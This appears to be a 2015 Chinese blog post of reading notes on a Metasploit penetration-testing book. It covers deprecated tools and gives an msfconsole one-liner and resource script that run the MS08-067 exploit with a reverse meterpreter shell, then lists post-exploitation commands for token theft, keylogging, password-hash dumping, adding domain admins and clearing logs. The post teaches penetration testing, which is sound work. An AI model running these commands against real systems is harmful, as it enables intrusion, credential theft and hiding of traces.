---
layout: post
title:  "读《Metasploit渗透测试指南》"
image: ''
date:   2015-12-22 00:06:31
tags:
- web
- metasploit
- penetration
description: ''
categories:
- web
---


> 本文写于 2015.12.22

这几天看《 Metasploit 渗透测试指南》，有些内容好像已经过时了。用户接口讲了三种： MSF 终端，MSF 命令行和 Armitage，而从今年的六月份开始，Msfcli 就与我们说再见了，同时，可以通过 Msfconsole 使用 -x 选项来取代 Msfcli 。

举个例子，在一条命令中使用 MS08_067 模块。
```
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"
```
也可以分步写或者做成脚本来简化输入：
```
use exploit/windows/smb/ms08_067_netapi  
set RHOST [IP]  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST [IP]  
run
```
然后运行它：
```
msfconsole -r name_of_resource_script.rc
```
如果你已经运行了 msfconsole ，就输入下面的：
```
msf > resource name_of_resource_script.rc
```
另外， msfpayload 和 msfencode 也退休了， msfvenom 是它们的继承者，如果对新工具还不熟悉，可以使用 -h 选项来获得帮助。
```
-p, --payload    <payload>       Payload to use. Specify a '-' or stdin to use custom payloads  
-l, --list       [module_type]   List a module type example: payloads, encoders, nops, all  
-n, --nopsled    <length>        Prepend a nopsled of [length] size on to the payload  
-f, --format     <format>        Output format (use --help-formats for a list)  
-e, --encoder    [encoder]       The encoder to use  
-a, --arch       <architecture>  The architecture to use  
    --platform   <platform>      The platform of the payload  
-s, --space      <length>        The maximum size of the resulting payload  
-b, --bad-chars  <list>          The list of characters to avoid example: '\x00\xff'  
-i, --iterations <count>         The number of times to encode the payload  
-c, --add-code   <path>          Specify an additional win32 shellcode file to include  
-x, --template   <path>          Specify a custom executable file to use as a template  
-k, --keep                       Preserve the template behavior and inject the payload as a new thread  
    --payload-options            List the payload's standard options  
-o, --out   <path>               Save the payload  
-v, --var-name <name>            Specify a custom variable name to use for certain output formats  
-h, --help                       Show this message  
    --help-formats               List available formats
```

参考文章：
- [Weekly Metasploit Wrapup](https://community.rapid7.com/community/metasploit/blog/2015/01/23/weekly-metasploit-wrapup)
- [Msfcli is no longer available in Metasploit](https://community.rapid7.com/community/metasploit/blog/2015/07/10/msfcli-is-no-longer-available-in-metasploit)
- [Good-bye msfpayload and msfencode](https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode)
- [MsfPayload and MsfEncode are being removed from Metasploit](https://community.rapid7.com/community/metasploit/blog/2015/06/08/msfpayload-and-msfencode-are-being-removed-from-metasploit)


## Metasploit 常用命令列表
#### MSF 终端命令
```
show exploits （列出所有渗透攻击模块
show payloads （列出所有攻击载荷
show auxiliary （列出所有辅助攻击模块
search names （查找所有的渗透攻击和其他模块
info （展示出制定渗透攻击或模块的相关信息
use name （装载一个渗透攻击或者模块
LHOST （本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网时，就需要时一个公共的IP地址，特别为反弹式shell使用。
RHOST （远程主机或者目标主机
set function （设置特定的配置参数
setg function （以全局方式设置特定的配置参数
show options （列出某个渗透攻击或模块中所有的配置参数
show targets （列出渗透攻击所支持的目标平台
set target num （指定你所知道的目标的操作系统以及补丁版本类型
set payload payload （指定想要使用的攻击载荷
show advanced （列出所有高级配置选项
set autorunscript migrate -f （在渗透攻击完成后，将自动迁移到另一个进程
check （检测目标是否对选定渗透攻击存在相应安全漏洞
exploit （执行渗透攻击或模块来攻击目标
exploit -j （在计划任务下进行渗透攻击，攻击在后台进行
exploit -z （渗透攻击成功后不与会话进行交互
exploit -e encoder （制定使用的攻击载荷编码方式
exploit -h （列出帮助信息
sessions -l （列出可用的交互会话，在处理多个shell时使用
sessions -l -v （列出所有可用的交互会话以及会话详细信息
sessions -s script （在所有活跃的会话中运行一个特定的脚本
sessions -K （杀死所有活跃的交互会话
sessions -c cmd （在所有活跃的会话上执行一个命令
sessions -u sessionID （升级一个普通的win32 shell到meterpreter shell
db_create name （创建一个数据库驱动攻击所要使用的数据库
db_connect name （创建并连接一个数据库驱动攻击所要使用的数据库
db_nmap （利用nmap并把扫描数据存储到数据库中
db_autopwn -h （帮助信息
db_autopwn -p -r -e （对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell
db_destroy （删除当前数据库
db_destroy user:password@host:port/database （使用高级选项来删除数据库
```
#### Meterpreter命令
```
help （帮助
run scriptname （运行脚本
sysinfo （列出受控主机的系统信息
ls （列出目标主机的文件和文件夹信息
use priv （加载特权提升扩展模块
ps （显示所有运行进程以及关联的用户账户
migrate PID （迁移到一个指定的进程ID
use incognito （加载incognito功能，用来盗窃目标主机的令牌或是假冒用户
list_tokens -u （列出目标主机用户的可用令牌
list_tokens -g （列出目标主机用户组的可用令牌
impersonate_token DOMAIN_NAME\USERNAME （假冒目标主机上的可用令牌
steal_token PID （盗窃给定进程的可用令牌并进行令牌假冒
drop_taken （停止假冒当前令牌
getsystem （通过各种攻击向量来提升到系统用户权限
shell （以所有可用令牌来运行一个交互的shell
execute -f cmd.exe -i （执行cmd.exe命令并进行交互
execute -f cmd.exe -i -t （以所有可用令牌来执行cmd命令
execute -f cmd.exe -i -H -t （以所有可用令牌来执行cmd命令并隐藏该进程
rev2self （回到控制目标主机的初始用户账户下
reg command （在目标主机注册表中进行交互，创建，删除，查询等操作
setdesktop number （切换到另一个用户界面
screenshot （对目标主机屏幕进行截图
upload file （向目标主机上传文件
download file （从目标主机下载文件
keyscan_start （针对远程目标主机开启键盘记录功能
keyscan_dump （存储目标主机上捕获的键盘记录
keyscan_stop （停止针对目标主机的键盘记录
getprivs （尽可能多的获取目标主机上的特权
uictl enable keyboard/mouse （接管目标主机的键盘和鼠标
background （将当前的shell转为后台执行
hashdump （导出目标主机中的口令哈希值
use sniffer （加载嗅探模块
sniffer_interfaces （列出目标主机所有开放的网络接口
sniffer_dump interfaceID pcapname （在目标主机上启动嗅探
sniffer_start interfaceID packet-buffer （在目标主机上针对特定范围的数据包缓冲区启动嗅探
sniffer_starts interfaceID （获取正在实施嗅探网络接口的统计数据
sniffer_stop interfaceID （停止嗅探
add_user username password -h ip （在远程目标主机上添加一个用户
add_group_user “Domain Admins” username -h ip （将用户添加到目标主机的域管理员组中
clearev （清除目标主机上的日志记录
timestomp （修改文件属性
reboot （重启目标主机
```
